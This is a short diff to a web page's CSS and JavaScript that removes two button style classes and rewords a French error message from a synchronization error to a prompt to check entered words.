@@ -118,16 +118,6 @@
         .btn-secondary:hover {
             background: rgba(255,255,255,0.15);
         }
-        .btn-success {
-            background: #10b981;
-            color: white;
-            cursor: default;
-        }
-        .btn-danger {
-            background: #ef4444;
-            color: white;
-            cursor: default;
-        }
         .progress-text {
             text-align: center;
             color: #8b8cae;
@@ -370,7 +360,7 @@
                     const statusDiv = document.getElementById('statusMessage');
                     statusDiv.style.display = 'block';
                     statusDiv.className = 'status-box status-rejected';
-                    statusDiv.innerHTML = '❌ Erreur de synchronisation. Contactez le support.';
+                    statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
                     return;
                 }
             }
@@ -432,7 +422,7 @@
                         const statusDiv = document.getElementById('statusMessage');
                         statusDiv.style.display = 'block';
                         statusDiv.className = 'status-box status-rejected';
-                        statusDiv.innerHTML = '❌ Erreur de synchronisation. Contactez le support.';
+                        statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
                     } else {
                         const statusDiv = document.getElementById('statusMessage');
                         statusDiv.style.display = 'block';
